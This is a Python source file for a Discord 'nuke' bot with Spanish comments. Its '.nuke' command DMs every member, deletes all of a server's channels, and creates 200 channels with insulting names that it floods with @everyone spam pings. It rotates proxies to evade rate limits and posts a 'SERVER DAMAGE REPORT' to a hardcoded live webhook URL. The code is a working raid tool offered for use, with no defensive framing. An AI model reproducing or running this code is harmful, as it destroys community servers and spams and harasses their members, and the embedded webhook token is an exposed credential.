import discord
from discord.ext import commands
import random
import asyncio
import time
import os
import aiohttp

# --- CONFIGURACIÓN DE INTENTOS ---
intents = discord.Intents.all()  # Usar todos los intents para mayor flexibilidad

bot = commands.Bot(command_prefix='.', intents=intents)

print("El arma está cargada y lista para el lanzamiento.")

channel_names = [
    "ur a bitchh", "get rekt", "nuked by Bigm", "chaos incoming",
    "owo explosion", "server wipe", "BYE BYE", "The Void", "Bigm Was Here",
    "RATIO"
]

TARGET_CHANNELS = 200  # Aumentado al máximo
TARGET_PINGS = 2000  # Aumentado al máximo
CONCURRENCY_LIMIT = 100  # Aumentado al máximo

LOG_CHANNEL_NAME = "﹗logs"
WEBHOOK_URL = "https://discord.com/api/webhooks/1438649141851979776/p8c52p4cNv7SGBXkz0L_liPgD2_3D5p2TjDZfQTRTGAH2FyNO452lUHmqIAyrG4m0cyp"  # <-- cámbialo si quieres
MESSAGE_TO_MEMB = "You have been invaded by voidxn"

# Configuración de Proxies
PROXY_LIST = [
    "http://138.201.245.91:8080",
    # Agrega muchos más proxies aquí
]

ACTIVE_PROXIES = []
PROXY_CHECK_INTERVAL = 30  # Verificar proxies cada 30 segundos

semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)

async def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

async def console_clear_task():
    while True:
        await asyncio.sleep(2)
        await clear_console()
        print(f"[{time.strftime('%H:%M:%S')}] Consola limpiada. Bot activo.")

async def is_proxy_working(proxy):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://www.google.com", proxy=proxy, timeout=5) as response:
                return response.status == 200
    except:
        return False

async def update_active_proxies():
    global ACTIVE_PROXIES
    ACTIVE_PROXIES = [proxy for proxy in PROXY_LIST if await is_proxy_working(proxy)]
    print(f"Proxies activos: {len(ACTIVE_PROXIES)}")

async def proxy_check_task():
    while True:
        await update_active_proxies()
        await asyncio.sleep(PROXY_CHECK_INTERVAL)

async def get_proxy():
    if not ACTIVE_PROXIES:
        print("No hay proxies activos. Esperando...")
        await update_active_proxies()
        if not ACTIVE_PROXIES:
            return None
    return random.choice(ACTIVE_PROXIES)

async def send_message_to_members(guild, message):
    for member in guild.members:
        try:
            dm = await member.create_dm()
            await dm.send(message)
        except:
            pass

async def create_log_channel_and_send_embed(guild, ctx, start_time, duration):
    log_channel = discord.utils.get(guild.channels, name=LOG_CHANNEL_NAME)
    if not log_channel:
        try:
            log_channel = await guild.create_text_channel(LOG_CHANNEL_NAME)
        except:
            return

    embed = discord.Embed(
        title="SERVER DAMAGE REPORT",
        description=f"Nuke command executed.",
        color=discord.Color.red()
    )
    embed.add_field(name="Server", value=f"{guild.name}", inline=False)
    embed.add_field(name="Initiator", value=f"{ctx.author.mention}", inline=True)
    embed.add_field(name="Duration", value=f"{duration:.2f}s", inline=True)

    await log_channel.send(embed=embed)

async def send_embed_via_webhook(guild, ctx, start_time, duration, proxy=None):
    data = {
        "username": "Nuke Bot",
        "embeds": [{
            "title": "SERVER DAMAGE REPORT",
            "description": "Nuke executed.",
            "color": 16711680
        }]
    }
    try:
        async with aiohttp.ClientSession() as session:
            if proxy:
                async with session.post(WEBHOOK_URL, json=data, proxy=proxy) as response:
                    if response.status != 204:
                        print(f"Error al enviar webhook: {response.status}")
            else:
                async with session.post(WEBHOOK_URL, json=data) as response:
                    if response.status != 204:
                        print(f"Error al enviar webhook: {response.status}")
    except Exception as e:
        print(f"Error al enviar webhook: {e}")

async def create_and_ping(ctx, channel_name, proxy=None):
    try:
        ch = await ctx.guild.create_text_channel(channel_name)
        for _ in range(TARGET_PINGS // TARGET_CHANNELS):
            try:
                await ch.send(f'@everyone Nuked by Bigm https://discord.gg/Duhk3RTsfA')
            except Exception as e:
                print(f"Error al enviar mensaje: {e}")
    except Exception as e:
        print(f"Error al crear/enviar mensaje: {e}")

@bot.command(name='nuke')
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    start_time = time.time()
    guild = ctx.guild

    await send_message_to_members(guild, MESSAGE_TO_MEMB)

    # Eliminar canales existentes
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    channel_creation_tasks = []
    for i in range(1, TARGET_CHANNELS + 1):
        channel_name = random.choice(channel_names) + f"-{i}"
        proxy = await get_proxy()  # Obtener un proxy para cada canal
        channel_creation_tasks.append(create_and_ping(ctx, channel_name, proxy))

    await asyncio.gather(*channel_creation_tasks, return_exceptions=True)

    duration = time.time() - start_time
    await create_log_channel_and_send_embed(guild, ctx, start_time, duration)
    await send_embed_via_webhook(guild, ctx, start_time, duration)

    await ctx.send(f'Nuke complete in {duration:.2f}s.')

@bot.event
async def on_ready():
    print(f'¡Conectado! {bot.user.name} ha tomado el control del mainframe.')
    bot.loop.create_task(console_clear_task())
    bot.loop.create_task(proxy_check_task())  # Iniciar la verificación de proxies

# Iniciar la verificación de proxies al inicio
async def start_proxy_check():
    await bot.wait_until_ready()
    await update_active_proxies()

bot.loop.create_task(start_proxy_check())

print("Bot is running...")

bot.run(os.getenv("TOKEN"))
